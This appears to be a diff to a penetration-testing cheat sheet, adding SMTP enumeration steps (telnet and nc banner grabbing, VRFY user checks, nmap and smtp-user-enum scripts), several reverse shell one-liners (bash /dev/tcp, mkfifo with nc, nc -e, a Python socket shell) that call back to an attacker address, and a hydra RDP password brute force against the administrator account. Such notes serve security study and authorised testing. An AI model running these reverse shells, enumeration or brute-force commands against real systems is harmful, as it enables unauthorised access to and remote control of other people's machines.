@@ -370,20 +370,44 @@ python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/d
 ## Port 25 - SMTP
 
 https://book.hacktricks.xyz/pentesting/pentesting-smtp#basic-information
+https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
+https://www.hackercoolmagazine.com/smtp-enumeration-with-kali-linux-nmap-and-smtp-user-enum/
+
 
 REF:Postfish
 ```
-nc -nvvC 10.11.1.111 25
-HELO foo<cr><lf>
 
-telnet 10.11.1.111 25
-VRFY root
+SMTP Server Commands:
+
+	1. HELO – sent by a client to introduce itself.
+	2. EHLO – another way of client introducing itself to server
+	3. HELP – used to see all commands.
+	4. RCPT – to identify message recipients.
+	5. DATA – sent by a client to initiate data transfer.
+	6. VRFY – verify if the mailbox exists.
+	7. QUIT – to end the session.
+
+# Connecting up to target with telnet 
+	telnet $ip 25
+
+# Check if root account exists
+	VRFY root
+
+# Banner Grab with nc
+	nc -vn $ip 25
 
 nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.11.1.111
 
-# Enumerate SMTP Users
+# Enumerate SMTP Users with VRFY method
 
-sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.1.1.65
+sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $ip
+
+# Enumerate SMTP Users with nmap
+
+	nmap --script smtp-enum-users.nse $ip
+
+# Note: ALL VALID USERS HAVE A MAILBOX ATTACHED TO THEM. THAT MEANS WE CAN SEND AN EMAIL
+# Note2: 
 
 Send email unauth:
 
@@ -1504,9 +1528,10 @@ https://www.revshells.com/
 ***escape quotes if running from command line*** (ex., ((\"192.168.49.232\",80)))
 ```bash
 # Linux
-bash -i >& /dev/tcp/10.11.1.111/4443 0>&1
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.111 4443 >/tmp/f
-nc -e /bin/sh 10.11.1.111 4443
+	bash -i >& /dev/tcp/10.11.1.111/4443 0>&1
+	bash -c "bash -i >& /dev/tcp/$ip/$lport 0>&1"
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.111 4443 >/tmp/f
+	nc -e /bin/sh 10.11.1.111 4443
 
 # Python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -2804,10 +2829,6 @@ $ips | ForEach-Object {
 Brute Forcing RDP:
 
 hydra -t 1 -V -f -l administrator -P Desktop/rockyou.txt rdp://192.168.100.55
-
-
-
-
 
 
 
